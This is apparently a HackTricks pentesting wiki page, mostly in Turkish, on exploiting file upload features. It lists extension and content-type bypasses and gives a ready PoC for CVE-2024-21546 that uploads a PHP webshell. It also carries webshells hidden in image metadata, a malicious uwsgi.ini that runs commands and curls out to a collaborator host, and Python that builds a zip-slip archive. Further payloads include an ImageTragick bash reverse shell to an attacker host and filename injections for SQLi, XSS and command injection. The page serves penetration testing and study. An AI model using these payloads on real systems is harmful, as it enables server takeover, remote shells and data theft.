# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodolojisi

Diğer yararlı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8'de çalışma**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Eğer uygulanıyorsa, **önceki uzantıları** **kontrol edin.** Ayrıca bunları bazı **büyük harflerle** de test edin: _pHp, .pHP5, .PhAr ..._
2. _Geçerli uzantıdan **önce geçerli bir uzantı eklemeyi** kontrol edin (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Sonuna **özel karakterler** eklemeyi deneyin. Burp ile tüm **ascii** ve **Unicode** karakterlerini **bruteforce** edebilirsiniz. (_Not: ayrıca **önceki** belirtilen **uzantıları** de deneyebilirsiniz_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını **kandırarak** korumaları atlatmayı deneyin; örneğin **uzantıyı çiftleme** veya uzantılar arasına **gereksiz veri** (**null bytes**) ekleme. _Daha iyi bir payload hazırlamak için **önceki uzantıları** de kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole **başka bir uzantı katmanı** ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **Exec uzantısını geçerli uzantıdan önce** koymaya çalışın ve sunucunun yanlış yapılandırılmış olmasını umut edin. (Apache yanlış yapılandırmalarını istismar etmek için faydalıdır; bazı durumlarda **.php** uzantısını içeren ama **.php ile bitmeyen** dosyalar da çalıştırılabilir):
- _ex: file.php.png_
7. **Windows** üzerinde **NTFS alternate data stream (ADS)** kullanımı. Bu durumda, yasaklı bir uzantıdan sonra ve izin verilen uzantıdan önce bir iki nokta işareti ":" eklenir. Sonuç olarak, sunucuda **yasaklı uzantılı boş bir dosya** oluşturulur (ör. "file.asax:.jpg”). Bu dosya, kısa dosya adı kullanımı gibi başka tekniklerle daha sonra düzenlenebilir. "**::$data**” deseni de dolu olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin sonuna bir nokta karakteri eklemek (örn. "file.asp::$data.") daha ileri kısıtlamaları atlatmakta faydalı olabilir.
8. Dosya adı sınırlarını kırmayı deneyin. Geçerli uzantı kesilir. Kötü amaçlı PHP dosyası geride kalır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Bazı upload handler'lar kaydedilen dosya adından sonundaki nokta karakterlerini kırpar veya normalize eder. UniSharp’ın Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1'den önceki sürümlerinde, uzantı doğrulamasını atlatabilirsiniz:

- Geçerli bir image MIME ve magic header kullanın (ör. PNG için `\x89PNG\r\n\x1a\n`).
- Yüklenen dosyayı PHP uzantısı ve sonrasında bir nokta olacak şekilde adlandırın, örn. `shell.php.`.
- Sunucu sonundaki noktayı kaldırır ve `shell.php` olarak saklar; bu dosya web tarafından servis edilen bir dizine (varsayılan public storage gibi `/storage/files/`) yerleştirilirse çalıştırılır.

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Sonra kaydedilen path'e istek gönderin (Laravel + LFM'de tipik):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager paketini ≥ 2.9.1 sürümüne yükseltin.
- Sunucu tarafında sıkı allowlists uygulayın ve kalıcı dosya adını yeniden doğrulayın.
- Yüklemeleri non-executable konumlardan sunun.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** kontrollerini, **Content-Type** **header**ının **value**sini şu şekilde ayarlayarak atlatın: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** kontrolünü, dosyanın başına gerçek bir resmin **bytes**larını ekleyerek ( _file_ komutunu şaşırtır) atlatın. Veya shell'i **metadata** içine yerleştirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya yükü doğrudan bir görüntüye de ekleyebilirsiniz:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Eğer **görüntünüze sıkıştırma (compression) ekleniyorsa**, örneğin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi standart PHP kütüphaneleri kullanılıyorsa, önceki teknikler işe yaramayabilir. Ancak, **PLTE chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmadan **sağ çıkacak** metin ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web sayfası ayrıca resmi **yeniden boyutlandırıyor (resizing)** olabilir; örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanılıyor olabilir. Ancak, **IDAT chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmadan **sağ çıkacak** metin ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Görüntü yeniden boyutlandırmaya (resizing) dayanacak bir payload oluşturmak için başka bir teknik de PHP-GD fonksiyonu `thumbnailImage` kullanmaktır. Ancak, **tEXt chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmadan **sağ çıkacak** metin ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Zaten yüklenmiş dosyayı **rename** ederek (uzantısını değiştirmek için) bir zafiyet bulun.
- Backdoor'u çalıştırmak için bir **Local File Inclusion** zafiyeti bulun.
- **Olası bilgi sızdırma (Information disclosure)**:
1. Aynı dosyayı aynı adla **birden fazla kez** (ve **aynı anda**) yükleyin.
2. Zaten **var olan** bir **dosya** veya **klasörün** **adıyla** bir dosya yükleyin.
3. Dosya adını **"."**, **".."** veya **"..."** olarak yüklemek. Örneğin, Apache üzerinde **Windows**'ta uygulama yüklenen dosyaları "/www/uploads/" dizinine kaydediyorsa, "." dosya adı "/www/" dizininde "uploads" adlı bir dosya oluşturacaktır.
4. **NTFS** üzerinde kolayca silinemeyebilecek bir dosya yükleyin, örneğin **"…:.jpg"**. (Windows)
5. **Windows** üzerinde adı `|<>*?”` gibi **geçersiz karakterler** içeren bir dosya yükleyin. (Windows)
6. **Windows** üzerinde CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9 gibi **rezerve (yasak) isimleri** kullanarak dosya yükleyin.
- Ayrıca, kurban yanlışlıkla açtığında kod çalıştıracak bir **executable** (.exe) veya daha az şüpheli bir **.html** yüklemeyi deneyin.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları java için `.jar` gibidir, fakat php içindir ve **php dosyası gibi kullanılabilir** (php ile çalıştırmak veya bir script içine include etmek gibi...).

`.inc` uzantısı bazen yalnızca dosya import etmek için kullanılan php dosyaları için kullanılır; dolayısıyla bir noktada biri bu uzantının **çalıştırılmasına izin vermiş olabilir**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Çeşitli scheme'leri gösteren zararlı bir `uwsgi.ini` dosyası örneğini düşünün:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

Payload'un yürütülmesi, konfigürasyon dosyasının parse edilmesi sırasında gerçekleşir. Konfigürasyonun etkinleştirilip parse edilmesi için uWSGI sürecinin ya yeniden başlatılması (olası bir çökme sonrası veya bir Denial of Service saldırısı nedeniyle) ya da dosyanın otomatik yeniden yüklemeye (auto-reload) ayarlanması gerekir. Auto-reload özelliği etkinse, değişiklik algılandığında dosyayı belirli aralıklarla yeniden yükler.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

uWSGI'nin konfigürasyon dosyası parse etme işleminin gevşek olduğunu anlamak çok önemlidir. Özellikle, burada bahsedilen payload bir ikili (binary) dosyaya (örneğin bir resim veya PDF) yerleştirilebilir; bu da potansiyel istismar alanını daha da genişletir.

## **wget File Upload/SSRF Trick**

In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosya indirdiğini** ve sizin **URL** **belirtebildiğinizi** görebilirsiniz. Bu durumlarda, kod indirilen dosyaların uzantısının bir whitelist içinde olup olmadığını kontrol ediyor olabilir; böylece sadece izin verilen dosyaların indirileceği garanti edilir. Ancak, **bu kontrol atlatılabilir.**\

The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.

linux'ta bir **dosya adı**nın maksimum uzunluğu **255** karakterdir; ancak **`wget`** dosya adlarını **236** karaktere kadar kısaltır. `wget` ile **"A"\*232+".php"+".gif"** adında bir dosya indirebilirsiniz; bu dosya adı **kontrolü atlatır** (bu örnekte **".gif"** **geçerli** bir uzantıdır) fakat `wget` dosyayı **"A"\*232+".php"** olarak **yeniden adlandıracaktır**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Dikkat: bu kontrolü atlatmak için aklınıza gelebilecek **başka bir seçenek**, **HTTP server'ın farklı bir dosyaya redirect etmesini** sağlamaktır; böylece başlangıçtaki URL kontrolü atlatır, ancak wget yönlendirilen dosyayı yeni adıyla indirir. Bu **çalışmaz** **temin ki** wget `--trust-server-names` **parametresiyle kullanılmıyorsa**, çünkü **wget yönlendirilen sayfayı orijinal URL'de belirtilen dosya adıyla indirir**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Bazı eski upload handler'ları, tek dosyalık bir upload'tan multi-file array'ler oluşturmak için `snprintf()` veya benzerlerini kullandığında, `_FILES` yapısını sahte olarak oluşturacak şekilde kandırılabilirler. `snprintf()` davranışındaki tutarsızlıklar ve truncation nedeniyle, dikkatle hazırlanmış tek bir upload, sunucu tarafında birden fazla indekslenmiş dosya gibi görünebilir ve katı bir şekil varsayan mantığı (ör. bunu çoklu dosya upload'u olarak ele alıp güvensiz dallara gitmek) şaşırtabilir. Günümüzde nadir olsa da, bu “index corruption” paterni zaman zaman CTF'lerde ve eski kod tabanlarında tekrar ortaya çıkar.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Eğer web server'a bir URL'den image çekmesini **belirtebiliyorsanız**, bir [SSRF](../ssrf-server-side-request-forgery/index.html) istismar etmeyi deneyebilirsiniz. Bu **image** bazı **public** bir sitede **kaydedilecekse**, ayrıca [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL gösterip **her ziyaretçinin bilgilerini çalabilirsiniz**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS amaçlı özel hazırlanmış PDF'ler: Aşağıdaki sayfa **PDF verisi enjekte ederek JS çalıştırma elde etme** yöntemini gösterir. Eğer PDF yükleyebiliyorsanız, verilen yönergelere uyan rastgele JS çalıştıracak bir PDF hazırlayabilirsiniz.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Dosya yüklerken herhangi bir **boyut limiti** olup olmadığını kontrol edin

İşte yükleyerek başarabileceğiniz şeylerin top 10 listesi (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Diğer dosya tipleri için şu sayfaya bakın: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Zip/Tar File Automatically decompressed Upload

Eğer sunucu içinde açılacak bir ZIP yükleyebiliyorsanız, iki şey yapabilirsiniz:

### Symlink

Diğer dosyalara soft link içeren bir link yükleyin; daha sonra, açılmış dosyalara eriştiğinizde linklenmiş dosyalara erişmiş olursunuz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere dekompresyon

Dekompresyon sırasında dizinlerde beklenmedik dosyaların oluşturulması ciddi bir sorundur. Bu düzenlemenin kötü amaçlı dosya yüklemeleri yoluyla OS-level command execution'a karşı koruma sağlayabileceği ilk varsayımlarına rağmen, ZIP arşiv formatının hiyerarşik sıkıştırma desteği ve directory traversal yetenekleri sömürülebilir. Bu, hedef uygulamanın dekompresyon işlevini manipüle ederek saldırganların kısıtlamaları atlatmasına ve güvenli upload dizinlerinden kaçmasına olanak tanır.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **symlink trick with evilarc** bir seçenektir. Hedef `/flag.txt` gibi bir dosya ise, sisteminizde o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın çalışması sırasında hata ile karşılaşmamasını sağlar.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python kodu örneği bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Sıkıştırmayı file spraying için kötüye kullanma**

Daha fazla ayrıntı için **orijinal gönderiye bakın**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell Oluşturma**: PHP kodu, `$_REQUEST` değişkeniyle gelen komutları çalıştırmak için yazılır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying ve Sıkıştırılmış Dosya Oluşturma**: Birden çok dosya oluşturulur ve bu dosyaları içeren bir zip arşivi hazırlanır.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor veya vi ile Değiştirme**: Zip içindeki dosya isimleri vi veya bir hex editor kullanılarak değiştirilir; dizinleri gezmek için "xxA" -> "../" olarak değiştirilir.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu içeriği bir görüntü uzantısıyla yükleyin; açığı istismar etmek için **(ImageMagick , 7.0.1-1)** (detaylar: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Bir PNG dosyasının IDAT chunk'ına bir PHP shell gömmek, belirli görüntü işleme operasyonlarını etkili bir şekilde atlatabilir. PHP-GD'den imagecopyresized ve imagecopyresampled fonksiyonları, sırasıyla görüntüleri yeniden boyutlandırmak ve yeniden örneklemek için yaygın olarak kullanıldığından bu bağlamda özellikle önemlidir. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilme yeteneği belirli kullanım senaryoları için önemli bir avantaj sağlar.

Bu tekniğin metodolojisi ve olası uygulamaları dahil olmak üzere ayrıntılı bir inceleme aşağıdaki makalede sunulmuştur: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak süreç ve etkileri hakkında kapsamlı bir anlayış sağlar.

Daha fazla bilgi: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar siber güvenlikte benzersiz bir araç olarak hizmet eder; aynı anda birden fazla dosya formatında geçerli şekilde var olabilen bukalemunlar gibidirler. İlginç bir örnek, hem GIF hem de RAR arşivi olarak işlev gören bir [GIFAR](https://en.wikipedia.org/wiki/Gifar) hibritidir. Bu tür dosyalar bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Poliglot dosyaların temel faydası, dosyaları türlerine göre tarayan güvenlik önlemlerini aşabilme kapasiteleridir. Birçok uygulamada yalnızca JPEG, GIF veya DOC gibi belirli dosya türlerinin yüklenmesine izin verilmesi yaygın bir uygulamadır; bu, JS, PHP veya Phar gibi potansiyel olarak zararlı formatların riskini azaltmak içindir. Ancak bir poliglot, birden fazla dosya türünün yapısal kriterlerine uyduğundan, bu kısıtlamaları gizlice atlatabilir.

Uyarlanabilirliklerine rağmen poliglotların sınırlamaları vardır. Örneğin, bir poliglot aynı anda bir PHAR file (PHp ARchive) ve bir JPEG olabilse de, yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılarda katıysa, bir poliglotun yalnızca yapısal ikiliği yüklenmesini garanti etmeyebilir.

Daha fazla bilgi: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Bir PDF dosyası gibi sahte göstererek, izin verilmese bile geçerli bir JSON dosyası yükleyerek dosya türü tespitlerinden nasıl kaçınılır (teknikler **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** kaynağından):

- **`mmmagic` library**: `%PDF` magic bytes ilk 1024 bayt içinde olduğu sürece geçerli sayılır (örnek için yazıya bakın)
- **`pdflib` library**: Kütüphanenin bunun bir pdf olduğunu düşünmesi için JSON'un içindeki bir alana sahte bir PDF formatı ekleyin (örnek için yazıya bakın)
- **`file` binary**: Bir dosyadan 1048576 bayta kadar okuyabilir. İçeriği bir json olarak parse edemeyeceği şekilde bundan daha büyük bir JSON oluşturun ve sonra JSON'un içine gerçek bir PDF'in başlangıç kısmını koyun; böylece bunun bir PDF olduğunu düşünecektir

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
